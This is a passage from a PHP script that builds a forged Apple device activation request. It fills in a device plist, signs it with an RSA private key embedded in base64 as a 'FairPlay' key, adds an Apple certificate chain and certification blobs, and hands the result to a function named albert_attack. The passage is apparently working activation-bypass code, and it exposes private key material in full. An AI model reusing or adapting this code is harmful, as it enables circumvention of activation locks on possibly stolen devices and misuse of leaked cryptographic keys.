		1oIy5sh/AbDHSQVmitgH9NoCpoctAiB9+1hOM8Zeb1htQV8s81Xg0aou/86P
		PveOu9TIzYQNnDBbMBUGByqGSM49AgGgCgYIKoZIzj0DAQcDQgAESTAiT/2L
		1L1+0JBiUSGPumizG+wQp12JUM0T80UqWbvEE9ljAk676/zhKQBjl38/Sn06
		yO2EABYoYBIlgEi0ZKAKBAggc2tzAgAAAKCBxDCBwQIBATAKBggqhkjOPQQD
		AgNHADBEAiAtvdWemPKvE6kfMpY9pUYuvJcXbznA/oVLeEXPbzXtTgIgCBJP
		dGxZs0OZLgdfNAwJuxa+1dqcFgV1LDen2Gi9eM8wWzAVBgcqhkjOPQIBoAoG
		CCqGSM49AwEHA0IABEkwIk/9i9S9ftCQYlEhj7posxvsEKddiVDNE/NFKlm7
		xBPZYwJOu+v84SkAY5d/P0p9OsjthAAWKGASJYBItGSgCgQIIHNrcwIAAAAw
		CgYIKoZIzj0EAwIDRwAwRAIgHU83XIiKQrKl0aoXCB+yJ5i05MQBRZ52f0zt
		yzsI34MCIF6QRIRaUsTcts4Q6f9Z/ME2fo8rEM34I6/KaMcD7+6q
		</data>
		<key>WifiAddress</key>
		<string>bc:4c:c4:14:58:ab</string>
	</dict>
</dict>
</plist>';

	$ActivationInfoXML64 = base64_encode($ActivationInfoXML);
	
	$FairplayPrivateKeyBase64		= "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlDV3dJQkFBS0JnUUMzQktyTFBJQmFiaHByKzRTdnVRSG5iRjBzc3FSSVE2Ny8xYlRmQXJWdVVGNnA5c2RjdjcwTityOHlGeGVzRG1wVG1LaXRMUDA2c3pLTkFPMWs1SlZrOS9QMWVqejA4Qk1lOWVBYjRqdUFoVldkZkFJeWFKN3NHRmplU0wwMTVtQXZyeFRGY09NMTBGL3FTbEFSQmljY3hIalBYdHVXVnIwZkxHcmhNKy9BTVFJREFRQUJBb0dBQ0dXM2JISFBOZGI5Y1Z6dC9wNFBmMDNTakoxNXVqTVkwWFk5d1VtL2gxczZyTE84Ky8xME1ETUVHTWxFZGNtSGlXUmt3T1ZpalJIeHpOUnhFQU1JODdBcnVvZmhqZGRiTlZMdDZwcFcybkxDSzdjRURRSkZhaFRXOUdRRnpwVlJRWFhmeHI0Y3MxWDNrdXRsQjZ1WTJWR2x0eFFGWXNqNWRqdjdEK0E3MkEwQ1FRRFpqMVJHZHhiZU9vNFh6eGZBNm40MkdwWmF2VGxNM1F6R0ZvQkpnQ3FxVnUxSlFPem9vQU1SVCtOUGZnb0U4K3VzSVZWQjRJbzBiQ1VUV0xwa0V5dFRBa0VBMTFyeklwR0loRmtQdE5jLzMzZnZCRmd3VWJzalRzMVY1RzZ6NWx5L1huRzlFTmZMYmxnRW9iTG1TbXozaXJ2QlJXQURpd1V4NXpZNkZOL0RtdGk1NndKQWRpU2Nha3VmY255dnp3UVo3UndwLzYxK2VyWUpHTkZ0YjJDbXQ4Tk82QU9laGNvcEhNWlFCQ1d5MWVjbS83dUovb1ozYXZmSmRXQkkzZkd2L2twZW13SkFHTVh5b0RCanB1M2oyNmJEUno2eHRTczc2N3IrVmN0VExTTDYrTzRFYWFYbDNQRW1DcngvVSthVGpVNDVyN0RuaThaK3dkaElKRlBkbkpjZEZrd0dId0pBUFErd1ZxUmpjNGgzSHd1OEk2bGxrOXdocEs5TzcwRkxvMUZNVmRheXRFbE15cXpRMi8wNWZNYjdGNnlhV2h1K1EyR0dYdmRsVVJpQTN0WTBDc2ZNMHc9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQ==";
	$FairPlayCertChain64 			= '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';
	
	openssl_sign($ActivationInfoXML, $signature, openssl_pkey_get_private(base64_decode($FairplayPrivateKeyBase64)), 'sha1WithRSAEncryption'); //sha1WithRSAEncryption
	$ActivationInfoXMLSignature = base64_encode($signature);

	$posti = 
'<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>ActivationInfoComplete</key>
	<true/>
	<key>ActivationInfoXML</key>
	<data>'.$ActivationInfoXML64.'</data>
	<key>FairPlayCertChain</key>
	<data>'.$FairPlayCertChain64.'</data>
	<key>FairPlaySignature</key>
	<data>'.$ActivationInfoXMLSignature.'</data>
	<key>RKCertification</key>
<data>
MIIB9zCCAZwCAQEwADCB2gIBATAKBggqhkjOPQQDAgNIADBFAiEAk0kFrgp9oIqPSyw4
CeWwPc1MAGYtjvghUvV+YvDGhicCIEE0vW+s4Zs61eFjJDzvVxAKbsHFNj7MtVrbr5zT
i4k5MFswFQYHKoZIzj0CAaAKBggqhkjOPQMBBwNCAARuSdhS4I5eL1IyV2c+G690w4DH
9DFQye4b8PMbQ7FKFnhGcUOXk0eTfeF4q+b+au3l22dbj1DdioLbCCbNFVyFoAoECCBz
a3NIAAAAohYEFIT4wv/S+twSVWiuIUZOBiBDJj+OMIG3AgEBMAoGCCqGSM49BAMCA0kA
MEYCIQDngLzCQYigVMuMh3dtsq8GxrcShp6QobrHkWEmtDwjWgIhAKeWSAcq9n+wgAav
LU5TYBDy2smBJPSJxlgnECyB29RsMFswFQYHKoZIzj0CAaAKBggqhkjOPQMBBwNCAASU
2VJGBNC+Hjw5KKv3qW9IFVBE5KdWnoMwJxku1j5+7lqSe2kYxYhT1rvPAt/r1/0wALzL
aY59NYA0Ax8rKWfWMAoGCCqGSM49BAMCA0kAMEYCIQDhoMxEfjuVQgqo9ol5O6Li1Omg
JMzaL4VCTNZVXfFv/AIhALdI44Q5KEuk0FwaycYSScndcuh5B88+NuFQn41isuwM
</data>
<key>RKSignature</key>
<data>
MEQCIBfETROMXro82io/uy53ChhYmoqvTsSSdL9K9YUxW+GLAiAhh9EZ4TRxuSqWoRqm
0cop5KHlreeLv+PwHKpXn9Vmfw==
</data>
<key>serverKP</key>
<data>
TlVMTA==
</data>
<key>signActRequest</key>
<data>
TlVMTA==
</data>
</dict>
</plist>';


	return albert_attack($posti);
}
